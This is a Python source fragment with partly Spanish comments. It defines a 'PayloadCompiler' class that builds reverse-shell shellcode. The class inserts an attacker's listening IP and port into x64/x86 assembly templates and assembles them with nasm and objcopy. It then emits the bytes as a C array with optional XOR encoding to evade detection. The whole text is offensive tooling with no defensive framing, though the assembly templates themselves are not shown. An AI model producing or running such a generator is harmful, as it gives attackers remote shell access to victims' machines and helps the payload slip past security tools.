class PayloadCompiler:
    
    def __init__(self, arch: str, lhost: str, lport: int, obfuscate: bool = True):
        self.arch = arch.lower()
        self.lhost = lhost
        self.lport = lport
        self.obfuscate = obfuscate
        self.tmp_dir = tempfile.mkdtemp(prefix="sigv5_comp_")

    def _ip_to_hex(self, ip: str) -> str:
        """Convierte IP a entero en formato Little-Endian Hex para asm."""
        packed = socket.inet_aton(ip)
        val = struct.unpack("<I", packed)[0]
        return f"0x{val:08x}"

    def _port_to_hex(self, port: int) -> str:
        """Convierte Puerto a entero en Big-Endian Hex para asm."""
        packed = struct.pack(">H", port)
        val = struct.unpack("<H", packed)[0] # we want the numeric value as it looks in memory
        return f"0x{val:04x}"

    def generate_shellcode(self) -> bytes:
        """Construye y compila el shellcode ASM usando NASM."""
        print(f"[*] Generating shellcode for {self.arch} | {self.lhost}:{self.lport}")
        
        tpl = TEMPLATE_ASM_REVERSESHELL_X64 if self.arch == "x64" else TEMPLATE_ASM_REVERSESHELL_X86
        
        asm_code = tpl.replace("{{IP_HEX}}", self._ip_to_hex(self.lhost))
        asm_code = asm_code.replace("{{PORT_HEX}}", self._port_to_hex(self.lport))
        
        asm_path = os.path.join(self.tmp_dir, "shellcode.asm")
        obj_path = os.path.join(self.tmp_dir, "shellcode.o")
        bin_path = os.path.join(self.tmp_dir, "shellcode.bin")
        
        with open(asm_path, "w") as f:
            f.write(asm_code)
            
        # Assemble (Requiere nasm instalado, fallback si no falla silencioso y retorna basura)
        fmt = "elf64" if self.arch == "x64" else "elf32"
        try:
            subprocess.run(["nasm", "-f", fmt, asm_path, "-o", obj_path], check=True, capture_output=True)
            subprocess.run(["objcopy", "-O", "binary", "-j", ".text", obj_path, bin_path], check=True, capture_output=True)
            
            with open(bin_path, "rb") as f:
                shellcode = f.read()
            return shellcode
        except subprocess.CalledProcessError as e:
            print(f"[!] Compilation Error: Ensure 'nasm' and 'binutils' are installed.")
            print(e.stderr.decode() if e.stderr else "")
            
            # Fallback mock shellcode just so it doesn't break
            print("[!] Using dummy shellcode payload as fallback.")
            return b"\x90\x90\x90\x90\xcc"

    def format_c_array(self, data: bytes, xor_key: int = 0) -> str:
        """Formatea binario crudo a un array the C `\x00\x11...`"""
        formatted = ""
        for i, byte in enumerate(data):
            if i % 12 == 0 and i > 0:
                formatted += "\n    "
            elif i == 0:
                formatted += "    "
            # Aplicar XOR si se pide
            enc_byte = byte ^ xor_key
            formatted += f"0x{enc_byte:02x}, "
            
        return formatted.rstrip(", ")

